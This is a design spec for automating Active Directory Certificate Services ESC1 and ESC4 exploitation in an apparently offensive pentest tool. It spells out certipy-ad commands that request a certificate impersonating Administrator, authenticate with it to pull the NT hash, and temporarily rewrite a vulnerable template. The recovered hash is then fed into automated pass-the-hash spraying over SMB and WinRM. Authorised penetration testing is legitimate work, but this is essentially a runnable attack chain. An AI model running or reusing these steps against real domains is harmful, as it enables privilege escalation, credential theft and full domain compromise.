# ADCS ESC Chain Automation — Design Spec

**Date:** 2026-05-23  
**Scope:** `lib/credsmode.py` — creds mode only  
**ESC variants covered:** ESC1, ESC4

---

## Context

When certipy-ad finds a vulnerable ADCS certificate template in creds mode, p0rtix currently logs the finding and stops. This spec adds automated follow-through: request a certificate impersonating Administrator, authenticate with it to get the NT hash, and feed that hash into the existing cred-reuse phase.

---

## Architecture

Two additions to `lib/credsmode.py`, called from within `_ad_core()`:

### 1. `_parse_adcs_find(out: str) -> list[tuple[str, str, str]]`

Parses `certipy-ad find -stdout -vulnerable` output and returns `(ca_name, template_name, esc_variant)` tuples for ESC1 and ESC4 findings only.

**Parsing logic:**
- Walk output lines, tracking `current_template` (reset on each `Template Name :` line) and `current_ca` (from `Certificate Authorities :` under a template, distinguished from the top-level section by requiring `current_template` to be set).
- When a line starting with `ESC1` or `ESC4` is found under a `[!] Vulnerabilities` block, emit a tuple.
- Returns an empty list if no ESC1/ESC4 found.

### 2. `_adcs_esc_chain(ip, domain, user, pw, ca_name, template_name, esc_variant, runner, findings, ws, available)`

Executes the cert request → auth → hash extraction chain for a single vulnerable template. Writes all output to findings via `h4`, `cmd`, `bullet`, `note`.

**ESC1 path:**
1. `certipy-ad req -u USER@DOMAIN -p PASS -ca CA_NAME -template TEMPLATE -upn administrator@DOMAIN -dc-ip IP -out <exploit_dir>/administrator`
2. Verify `.pfx` written to `ws.machine_dir / "exploit" / "administrator.pfx"`
3. `certipy-ad auth -pfx <pfx_path> -dc-ip IP -domain DOMAIN -username administrator`
4. Parse NT hash via regex `Got hash for .+?:\s*[0-9a-fA-F]+:([0-9a-fA-F]+)`
5. `ws.append_hash_file("ntlm.hash", [...])` + `ws.add_cred("administrator:<NT>")`
6. `findings.add_summary(f"ADCS {esc_variant} → administrator NT hash in loot/ntlm.hash")`

**ESC4 path (wraps ESC1):**
1. `certipy-ad template -u USER@DOMAIN -p PASS -template TEMPLATE -save-old -dc-ip IP` — patches template to ESC1-exploitable; certipy writes `<TEMPLATE>.json` to CWD
2. Move backup JSON from CWD to `ws.machine_dir / "exploit" / "<TEMPLATE>_original.json"`
3. Run ESC1 chain (steps 1–6 above)
4. `certipy-ad template -u USER@DOMAIN -p PASS -template TEMPLATE -configuration <backup_json> -dc-ip IP` — restore regardless of ESC1 outcome

**Failure handling:** On any step failure, log via `findings.note()` with trimmed error output, skip remaining steps for that template, continue to next tuple. ESC4 restore always runs (success or failure).

---

## Changes to `_ad_core()` (lines 304–324)

Replace the existing certipy block with:

1. Add `-vulnerable` flag to the `certipy-ad find` command (reduces output noise; was missing).
2. Call `_parse_adcs_find(out)` to get structured tuples.
3. Write summary bullets for all found vulns (preserved from current behaviour).
4. For each tuple, call `_adcs_esc_chain(...)`.
5. Fallback: if parser returns empty but raw "ESC" text is present, retain old bullet-per-line behaviour.

---

## Output & Loot

| Artifact | Location |
|---|---|
| PFX certificate | `<workspace>/<name>/exploit/administrator.pfx` |
| ESC4 template backup | `<workspace>/<name>/exploit/<TEMPLATE>_original.json` |
| NT hash | `loot/ntlm.hash` (via `ws.append_hash_file`) |
| Cred for reuse | `loot/creds_found.txt` as `administrator:<NT>` (via `ws.add_cred`) |

The existing cred-reuse phase (`_run_cred_reuse`) automatically picks up anything in `creds_found.txt` and sprays it via nxc SMB/WinRM — no changes needed there.

---

## Findings Structure (on success)

```
#### ADCS ESC1: UserAuthentication
> `certipy-ad req ...`
> `certipy-ad auth ...`
- Certificate obtained → `exploit/administrator.pfx`
- **NT hash for administrator:** `<hash>`
- Hash saved to `loot/ntlm.hash` — cred-reuse phase will spray it
```

Summary line:
```
**ADCS ESC1 → administrator NT hash** in `loot/ntlm.hash`
```

---

## Verification

1. Run in creds mode against an AD target with ADCS (ESC1 or ESC4 vulnerable template).
2. Confirm `certipy-ad find -vulnerable` output appears in `findings.md` under "ADCS Templates".
3. Confirm `exploit/administrator.pfx` created in workspace.
4. Confirm NT hash in `loot/ntlm.hash` and `loot/creds_found.txt`.
5. Confirm cred-reuse phase picks up the hash and shows SMB PTH result.
6. For ESC4: confirm template restored (no `[!] Vulnerabilities` in a subsequent certipy find run against the same template).
